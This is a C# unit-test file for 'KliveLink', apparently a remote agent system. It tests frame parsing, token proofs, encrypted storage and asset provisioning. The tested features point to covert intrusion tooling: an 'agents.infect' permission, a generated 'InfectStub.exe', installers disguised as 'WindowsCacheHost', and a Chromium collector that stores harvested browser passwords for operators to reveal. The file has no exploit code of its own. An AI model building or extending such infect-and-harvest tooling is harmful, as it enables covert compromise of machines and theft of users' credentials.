using KliveLink.Contracts;
using Omnipotent.Profiles.Permissions;
using Omnipotent.Services.KliveLink;

namespace Omnipotent.Tests.KliveLink;

public sealed class KliveLinkV2Tests
{
    [Fact]
    public void Frame_RoundTrips_AndDetectsTamper()
    {
        var frame = new V2Frame
        {
            Type = V2FrameType.Command,
            StreamId = 7,
            Sequence = 42,
            Payload = "{\"hello\":\"world\"}",
        };
        byte[] bytes = frame.ToBytes();
        Assert.True(V2Frame.TryParse(bytes, out V2Frame? parsed, out int consumed));
        Assert.Equal(bytes.Length, consumed);
        Assert.NotNull(parsed);
        Assert.Equal(V2FrameType.Command, parsed!.Type);
        Assert.Equal(7u, parsed.StreamId);
        Assert.Equal(42ul, parsed.Sequence);
        Assert.Equal(frame.Payload, parsed.Payload);

        bytes[10] ^= 0xFF;
        Assert.Throws<InvalidDataException>(() => V2Frame.TryParse(bytes, out _, out _));
    }

    [Fact]
    public void Proof_IsDeterministic()
    {
        string a = V2Proof.Compute("dev-token", "agent-1", "nonce-a", "nonce-b");
        string b = V2Proof.Compute("dev-token", "agent-1", "nonce-a", "nonce-b");
        string c = V2Proof.Compute("dev-token", "agent-1", "nonce-a", "nonce-c");
        Assert.Equal(a, b);
        Assert.NotEqual(a, c);
    }

    [Fact]
    public void Store_UpsertsAgent_AndPurgesAllData()
    {
        string root = Path.Combine(Path.GetTempPath(), "klive-v2-tests", Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(root);
        try
        {
            var store = new KliveLinkV2Store(
                Path.Combine(root, "v2.db"),
                Path.Combine(root, "v2.key"),
                Path.Combine(root, "collections"));

            string agentId = "agent-test";
            store.UpsertAgent(new KliveLinkV2AgentRecord
            {
                AgentId = agentId,
                MachineName = "TEST-PC",
                OsVersion = "Windows 11",
                AgentVersion = "2.0.0",
                FirstSeen = DateTimeOffset.UtcNow,
                LastSeen = DateTimeOffset.UtcNow,
                ConnectedAt = DateTimeOffset.UtcNow,
                IsConnected = true,
                TokenHash = "abc",
            });
            Assert.Equal("TEST-PC", store.GetAgent(agentId)!.MachineName);
            Assert.Single(store.ListAgents());

            string snapshotId = "snap-1";
            store.CreateSnapshot(new KliveLinkV2SnapshotRecord
            {
                SnapshotId = snapshotId,
                AgentId = agentId,
                Tier = "T0",
                Profile = "t0-fast",
                Status = "complete",
                StartedAt = DateTimeOffset.UtcNow,
                CompletedAt = DateTimeOffset.UtcNow,
                Bytes = 128,
                Sha256 = "sha",
                ManifestJson = "{}",
                BundlePath = "",
            }, new[]
            {
                new V2CollectionRecord
                {
                    Collector = "chromium",
                    Category = "browser.password",
                    SourcePath = "https://example.test",
                    Name = "user",
                    Username = "user",
                    Secret = "hunter2",
                    Url = "https://example.test",
                },
            }, "");

            Assert.Single(store.ListSnapshots(agentId));
            var records = store.SearchRecords(agentId, null, null);
            Assert.Single(records);
            var revealed = store.GetRecord(records[0].RecordId, revealSecret: true);
            Assert.Equal("hunter2", revealed!.Secret);
            store.RecordCommand("cmd-1", agentId, "test", "GetSystemInfo", "{}", "ok", DateTimeOffset.UtcNow);

            var summary = store.GetDataSummary(agentId);
            Assert.Equal(1, summary.Commands);
            Assert.Equal(1, summary.Snapshots);
            Assert.Equal(1, summary.Records);

            var (purged, _) = store.PurgeAgent(agentId, keepAudit: false);
            Assert.Equal(1, purged.Records);
            Assert.Null(store.GetAgent(agentId));
            Assert.Empty(store.ListSnapshots(agentId));
            Assert.Empty(store.SearchRecords(agentId, null, null));

            byte[] bundle = { 1, 2, 3, 4, 5 };
            string bundlePath = Path.Combine(root, "bundle.zip");
            File.WriteAllBytes(bundlePath, bundle);
            string encryptedPath = store.EncryptBundle(bundlePath);
            Assert.EndsWith(".enc", encryptedPath);
            Assert.Equal(bundle, store.ReadBundle(encryptedPath));
        }
        finally
        {
            try { Directory.Delete(root, true); } catch { }
        }
    }

    [Fact]
    public void KliveLinkPerms_AllKeysAreCatalogValid()
    {
        Assert.Equal("klivelink.agents.infect", KliveLinkPerms.Infect.Key);
        Assert.Equal("klivelink.collection.view", KliveLinkPerms.CollectionView.Key);
        Assert.Equal("klivelink.agents.purge", KliveLinkPerms.AgentsPurge.Key);
    }

    [Fact]
    public void Provisioner_GeneratesPortableInstallerAssets()
    {
        string root = Path.Combine(Path.GetTempPath(), "klive-provision", Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(root);
        try
        {
            var options = new KliveLinkV2Options
            {
                DataDirectory = root,
                DbPath = Path.Combine(root, "v2.db"),
                KeyPath = Path.Combine(root, "v2.key"),
                TokenFilePath = Path.Combine(root, "v2-tokens.json"),
                CollectionDirectory = Path.Combine(root, "collections"),
                TokenHashes = new HashSet<string>(StringComparer.OrdinalIgnoreCase),
                AllowDevToken = true,
            };
            KliveLinkAssetProvisioner.Ensure(options);
            string generated = KliveLinkAssetProvisioner.GeneratedDirectory(options);
            Assert.True(File.Exists(Path.Combine(generated, "WindowsCacheHost.exe")));
            Assert.True(File.Exists(Path.Combine(generated, "WindowsCacheHostSetup.exe")));
            Assert.True(File.Exists(Path.Combine(generated, "InfectStub.exe")));
            Assert.True(File.Exists(Path.Combine(generated, "klive.config.json")));
            Assert.True(File.Exists(Path.Combine(generated, "agent-token.txt")));
            Assert.NotEmpty(options.TokenHashes);
            byte[] setup = File.ReadAllBytes(Path.Combine(generated, "WindowsCacheHostSetup.exe"));
            Assert.True(setup.Length > 100_000);
            Assert.Equal((byte)'M', setup[0]);
            Assert.Equal((byte)'Z', setup[1]);
        }
        finally
        {
            try { Directory.Delete(root, true); } catch { }
        }
    }

    [Fact]
    public void Options_HashesPlainTokens()
    {
        var options = new KliveLinkV2Options
        {
            TokenHashes = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { V2Proof.Sha256Hex("secret-token") },
            AllowDevToken = false,
        };
        Assert.True(options.IsTokenValid("secret-token"));
        Assert.False(options.IsTokenValid("wrong"));
        Assert.False(options.IsTokenValid(""));
    }

    [Fact]
    public void SecretBox_LoadsHexBase64AndRecoversCorruptKey()
    {
        string root = Path.Combine(Path.GetTempPath(), "klive-secretbox-tests", Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(root);
        try
        {
            // 1. Raw 32 bytes
            string rawKeyPath = Path.Combine(root, "raw.key");
            File.WriteAllBytes(rawKeyPath, new byte[32] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 });
            var box1 = new KliveLinkV2SecretBox(rawKeyPath);
            string cipher1 = box1.Protect("hello-raw");
            Assert.Equal("hello-raw", box1.Unprotect(cipher1));

            // 2. 64-char hex with trailing newline
            string hexKeyPath = Path.Combine(root, "hex.key");
            File.WriteAllText(hexKeyPath, "0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f20\r\n");
            var box2 = new KliveLinkV2SecretBox(hexKeyPath);
            Assert.Equal("hello-raw", box2.Unprotect(cipher1));

            // 3. 44-char Base64 with trailing spaces
            string b64KeyPath = Path.Combine(root, "b64.key");
            File.WriteAllText(b64KeyPath, "AQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyA= \n");
            var box3 = new KliveLinkV2SecretBox(b64KeyPath);
            Assert.Equal("hello-raw", box3.Unprotect(cipher1));

            // 4. 0-byte corrupt file recovery
            string corruptKeyPath = Path.Combine(root, "empty.key");
            File.WriteAllBytes(corruptKeyPath, Array.Empty<byte>());
            var box4 = new KliveLinkV2SecretBox(corruptKeyPath);
            string cipher4 = box4.Protect("survived-corrupt-file");
            Assert.Equal("survived-corrupt-file", box4.Unprotect(cipher4));
            Assert.True(File.Exists(corruptKeyPath));
            Assert.Equal(32, File.ReadAllBytes(corruptKeyPath).Length);
        }
        finally
        {
            try { Directory.Delete(root, true); } catch { }
        }
    }
}
